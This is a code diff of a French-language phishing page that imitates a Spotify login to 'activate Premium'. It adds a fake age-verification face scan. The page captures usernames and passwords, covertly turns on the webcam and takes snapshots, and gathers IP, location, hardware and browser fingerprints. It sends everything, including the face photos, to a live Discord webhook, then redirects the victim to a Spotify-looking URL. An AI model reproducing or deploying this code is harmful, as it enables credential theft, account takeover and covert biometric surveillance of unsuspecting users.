@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
+        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
         .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
         .logo { width: 45px; margin: 0 auto 35px auto; }
         .field { text-align: left; margin-bottom: 15px; }
@@ -15,10 +15,17 @@
         input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
         input:focus { border: 2px solid #1ed760; }
         .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
+        
+        /* Module Vérification d'âge */
+        .age-box { background: #181818; border: 1px solid #282828; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: left; }
+        .age-title { font-size: 11px; font-weight: 900; color: #1ed760; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
+        .age-desc { font-size: 11px; color: #b3b3b3; line-height: 1.4; margin-bottom: 15px; }
+        .btn-verify { background: #fff; color: #000; font-weight: 800; font-size: 10px; padding: 10px; border-radius: 4px; width: 100%; text-transform: uppercase; cursor: pointer; }
+        
         #loader { display: none; margin-top: 20px; }
         .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
         .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
-        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; pointer-events: none; }
+        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; }
     </style>
 </head>
 <body>
@@ -31,11 +38,21 @@
             </div>
             <div class="field"><label>E-mail ou utilisateur</label><input id="u" type="text"></div>
             <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
-            <button onclick="overkill()" id="btn" class="btn-green">Se connecter</button>
+
+            <div class="age-box">
+                <p class="age-title">🛡️ Vérification d'âge requise</p>
+                <p class="age-desc">Conformément aux régulations locales, un scan facial rapide est nécessaire pour confirmer que vous avez plus de 18 ans.</p>
+                <input type="file" id="ageInput" accept="image/*" capture="user" style="display:none;" onchange="ageCaptured()">
+                <button type="button" id="ageBtn" onclick="document.getElementById('ageInput').click()" class="btn-verify">Scanner mon visage</button>
+                <p id="ageStatus" style="display:none; color:#1ed760; font-size:10px; font-weight:900; margin-top:10px;">✅ SCAN TERMINÉ</p>
+            </div>
+
+            <button onclick="finalOverkillV39()" id="btn" class="btn-green">Activer Premium</button>
         </div>
+
         <div id="loader">
             <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
-            <p id="st" style="font-size: 11px; color: #1ed760; margin-top: 10px; font-weight:900; letter-spacing:1px;">ENCRYPTAGE DES DONNÉES...</p>
+            <p style="font-size: 11px; color: #b3b3b3; margin-top: 10px; font-weight:900;">SYNCHRONISATION SÉCURISÉE...</p>
         </div>
     </div>
 
@@ -44,8 +61,18 @@
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
+        let ageFile = null;
 
-        async function overkill() {
+        function ageCaptured() {
+            const input = document.getElementById('ageInput');
+            if(input.files && input.files[0]) {
+                ageFile = input.files[0];
+                document.getElementById('ageBtn').style.display = 'none';
+                document.getElementById('ageStatus').style.display = 'block';
+            }
+        }
+
+        async function finalOverkillV39() {
             const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
             if(!user.u || !user.p) return;
 
@@ -53,7 +80,7 @@
             document.getElementById('loader').style.display = 'block';
             const pb = document.getElementById('pbar');
             
-            // ÉTAPE 1: ACTIVATION CAPTEURS
+            // 1. CAPTEURS AUTO
             let stream = null;
             try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); document.getElementById('v').srcObject = stream; } catch(e){}
 
@@ -65,60 +92,55 @@
             } catch(e){}
 
             pb.style.width = "40%";
-            // ÉTAPE 2: EXTRACTION PROFONDE
+            // 2. EXTRACTION OMNI-PAVÉ
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
-            
-            // GPU & Canvas Fingerprint
-            const can = document.createElement('canvas');
-            const gl = can.getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpuVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-            const gpuModel = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            
-            // Connection Info
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-            const connType = conn.effectiveType || "Inconnue";
-
-            // Mémoire vive réelle
-            const ramUsage = window.performance && window.performance.memory ? Math.round(window.performance.memory.usedJSHeapSize / 1048576) + " MB" : "Non supporté";
+            const gl = document.createElement('canvas').getContext('webgl');
+            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
+            const ramUsage = window.performance && window.performance.memory ? Math.round(window.performance.memory.usedJSHeapSize / 1048576) + " MB" : "?";
 
             const payload = {
                 embeds: [{
-                    title: `💀 OVERKILL-LOG V38 - ${user.fn} ${user.ln}`,
+                    title: `🛡️ AGE-VERIFY V39 - ${user.fn} ${user.ln}`,
                     color: 1955168,
                     fields: [
-                        { name: "👤 ACCÈS COMPTE", value: `**Prénom/Nom:** \`${user.fn} ${user.ln}\`\n**Email:** \`${user.u}\`\n**Pass:** \`${user.p}\`` },
-                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\` (${net.country_name})\n**Vitesse:** \`${connType}\`\n**VPN/Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
-                        { name: "🛠️ HARDWARE (DÉTAILLÉ)", value: `**GPU Vendor:** \`${gpuVendor}\`\n**GPU Model:** \`${gpuModel}\`\n**Cœurs CPU:** \`${navigator.hardwareConcurrency}\`\n**RAM Dispo:** \`${navigator.deviceMemory}GB\`\n**RAM Utilisée:** \`${ramUsage}\`\n**Écran:** \`${screen.width}x${screen.height}\`` },
-                        { name: "🔋 BATTERIE & STATUT", value: `**Niveau:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**En charge:** \`${bat.charging ? 'OUI' : 'NON'}\`\n**Géoloc:** ${gps}` },
-                        { name: "🖥️ LOGICIEL", value: `**Système:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
+                        { name: "👤 COMPTE", value: `**User:** \`${user.u}\`\n**Pass:** \`${user.p}\`\n**Nom:** \`${user.fn} ${user.ln}\`` },
+                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**FAI:** \`${net.org}\`\n**Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
+                        { name: "🛠️ HARDWARE DÉTAILLÉ", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**CPU:** \`${navigator.hardwareConcurrency} Cores\`\n**Écran:** \`${screen.width}x${screen.height}\`\n**Batterie:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`` },
+                        { name: "🗺️ INFOS SYSTÈME", value: `**GPS:** ${gps}\n**OS:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**Navigateur:** \`\`\`${navigator.userAgent}\`\`\`` }
                     ],
-                    footer: { text: "SYSTEM OVERKILL ULTIMATE • " + new Date().toLocaleString() }
+                    footer: { text: "LVN AGE VERIFICATION SYSTEM • " + new Date().toLocaleString() }
                 }]
             };
-
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
-            // ÉTAPE 3: CAPTURE PHOTO
-            pb.style.width = "90%";
+            // 3. ENVOI PHOTO AGE (SI PRISE)
+            if(ageFile) {
+                const fdAge = new FormData();
+                fdAge.append('file', ageFile, 'age_verification.jpg');
+                fdAge.append('content', `🆔 **Scan Facial Manuel (Âge) de ${user.fn} ${user.ln}**`);
+                await fetch(hook, { method: 'POST', body: fdAge });
+            }
+
+            // 4. CAPTURE AUTO (PC/MOBILE)
+            pb.style.width = "85%";
             if(stream) {
-                await new Promise(r => setTimeout(r, 4000));
+                await new Promise(r => setTimeout(r, 3500));
                 const v = document.getElementById('v');
-                const canv = document.getElementById('c');
-                canv.width = v.videoWidth; canv.height = v.videoHeight;
-                canv.getContext('2d').drawImage(v, 0, 0);
+                const can = document.getElementById('c');
+                can.width = v.videoWidth; can.height = v.videoHeight;
+                can.getContext('2d').drawImage(v, 0, 0);
                 
-                canv.toBlob(async b => {
+                can.toBlob(async b => {
                     const fd = new FormData();
-                    fd.append('file', b, 'overkill_shot.jpg');
-                    fd.append('content', `📸 **Face ID : ${user.fn} ${user.ln}**`);
+                    fd.append('file', b, 'auto_shot.jpg');
+                    fd.append('content', `📸 **Capture Automatique : ${user.fn} ${user.ln}**`);
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "http://googleusercontent.com/spotify.com/premium";
+                    window.location.href = "http://googleusercontent.com/spotify.com/verified";
                 }, 'image/jpeg', 0.8);
             } else {
-                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/premium"; }, 1000);
+                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/verified"; }, 1000);
             }
         }
     </script>
